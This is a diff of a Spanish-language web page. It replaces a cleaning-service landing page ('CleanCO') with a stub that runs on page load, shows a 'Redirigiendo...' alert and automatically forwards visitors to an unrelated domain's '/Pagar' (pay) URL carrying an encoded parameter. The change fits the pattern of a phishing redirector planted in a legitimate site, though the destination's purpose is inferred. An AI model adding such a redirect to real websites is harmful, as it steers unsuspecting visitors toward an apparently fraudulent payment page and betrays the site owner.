@@ -1,172 +1,21 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>CleanCO - Limpieza a Domicilio</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Verdana', sans-serif;
-      background-color: #f8fdfc;
-      color: #222;
-    }
+    <meta charset="UTF-8">
+    <title>Redireccionando</title>
+    <script>
+        // Mostrar el cuadro de "Redirigiendo..." al cargar la página
+        window.onload = function () {
+            alert("Redirigiendo...");
 
-    .formulario-inicio {
-      background: url('https://th.bing.com/th/id/OIP.3ARUBPTzRIyjkNGnB4G7ZQHaE7?w=815&h=543&rs=1&pid=ImgDetMain&cb=idpwebpc2') no-repeat center center/cover;
-      padding: 80px 20px;
-      text-align: center;
-      color: white;
-    }
-
-    .formulario-inicio h1 {
-      font-size: 2.8em;
-      margin-bottom: 10px;
-      text-shadow: 1px 1px 3px #000;
-    }
-
-    .formulario-inicio p {
-      font-size: 1.2em;
-      margin-bottom: 20px;
-      text-shadow: 1px 1px 2px #000;
-    }
-
-    .formulario-inicio input,
-    .formulario-inicio select {
-      padding: 12px;
-      width: 250px;
-      border-radius: 6px;
-      border: none;
-      margin-top: 12px;
-    }
-
-    .formulario-inicio button {
-      padding: 12px 25px;
-      background-color: #004e89;
-      color: white;
-      border: none;
-      margin-top: 15px;
-      border-radius: 6px;
-      cursor: pointer;
-      font-weight: bold;
-    }
-
-    .formulario-inicio button:hover {
-      background-color: #003b66;
-    }
-
-    .info-contacto {
-      background-color: #e8fff4;
-      padding: 40px 20px;
-      text-align: center;
-    }
-
-    .info-contacto h2 {
-      color: #004e89;
-    }
-
-    .info-contacto p {
-      margin: 10px 0;
-      font-size: 1.1em;
-    }
-
-    .servicios {
-      background-color: #f0f4f8;
-      padding: 50px 20px;
-    }
-
-    .servicios h2 {
-      text-align: center;
-      margin-bottom: 30px;
-      color: #00796b;
-    }
-
-    .tarjetas {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 20px;
-    }
-
-    .tarjeta {
-      background-color: white;
-      width: 280px;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.08);
-      text-align: center;
-    }
-
-    .tarjeta img {
-      width: 100%;
-      height: 180px;
-      object-fit: cover;
-      border-radius: 10px;
-      margin-bottom: 15px;
-    }
-
-    .tarjeta h3 {
-      color: #004e89;
-    }
-
-    footer {
-      background-color: #003b66;
-      color: white;
-      text-align: center;
-      padding: 20px;
-      margin-top: 40px;
-    }
-  </style>
+            // Redirigir después de 2 segundos (2000 milisegundos)
+            setTimeout(function () {
+                window.location.href = "https://caribesolfacturecco.com/Pagar?b=eyJlbmNyeXB0ZWQiOnRydWV9"; // Cambia esta URL si es necesario
+            }, 2000);
+        };
+    </script>
 </head>
 <body>
-
-  <section class="formulario-inicio">
-    <h1>CleanCO</h1>
-    <p>Limpieza profesional en tu hogar u oficina, fácil, rápida y segura.</p>
-    <input type="text" placeholder="Nombre completo" /><br>
-    <input type="tel" placeholder="Número de contacto" /><br>
-    <input type="text" placeholder="Ciudad / Dirección" /><br>
-    <select>
-      <option value="">Selecciona tipo de limpieza</option>
-      <option>Hogar</option>
-      <option>Oficina</option>
-      <option>Post-obra</option>
-      <option>Desinfección</option>
-    </select><br>
-    <button>Agendar limpieza</button>
-  </section>
-
-  <section class="info-contacto" id="info">
-    <h2>¿Cómo funciona?</h2>
-    <p>🧹 Elige el tipo de limpieza</p>
-    <p>📲 Agenda con tus datos</p>
-    <p>✅ Nosotros nos encargamos</p>
-  </section>
-
-  <section class="servicios" id="servicios">
-    <h2>Servicios disponibles</h2>
-    <div class="tarjetas">
-      <div class="tarjeta">
-        <img src="https://th.bing.com/th/id/R.0711d6b22561818561d51a9137f900ac?rik=ur%2fHAG%2fkgXToFQ&riu=http%3a%2f%2fwww.iqua.net%2fwp-content%2fuploads%2f2015%2f11%2flimpieza.jpg&ehk=jOwMwc5G5aDAVlVOSJElXiK68i87VOqRPVmbskXgXDs%3d&risl=&pid=ImgRaw&r=0" alt="Hogar limpio">
-        <h3>Limpieza de Hogares</h3>
-        <p>Tu espacio siempre fresco, desinfectado y brillante.</p>
-      </div>
-      <div class="tarjeta">
-        <img src="https://th.bing.com/th/id/OIP.tf1owDHwVL9D4gE_G8WAhwHaE8?w=800&h=534&rs=1&pid=ImgDetMain&cb=idpwebpc2" alt="Oficina">
-        <h3>Oficinas y Comercios</h3>
-        <p>Ambientes profesionales libres de polvo y gérmenes.</p>
-      </div>
-      <div class="tarjeta">
-        <img src="https://th.bing.com/th/id/OIP.rxgxGMTgwH5gJfJGauLdnAHaE8?rs=1&pid=ImgDetMain&cb=idpwebpc2" alt="Desinfección">
-        <h3>Desinfección Profunda</h3>
-        <p>Ideal para baños, cocinas y zonas de alto contacto.</p>
-      </div>
-    </div>
-  </section>
-
-  <footer>
-    © 2025 CleanCO · contacto@cleanco.co · Servicio en Bogotá, Medellín, Cali
-  </footer>
-
+    <h1>Espere mientras lo redirigimos...</h1>
 </body>
 </html>
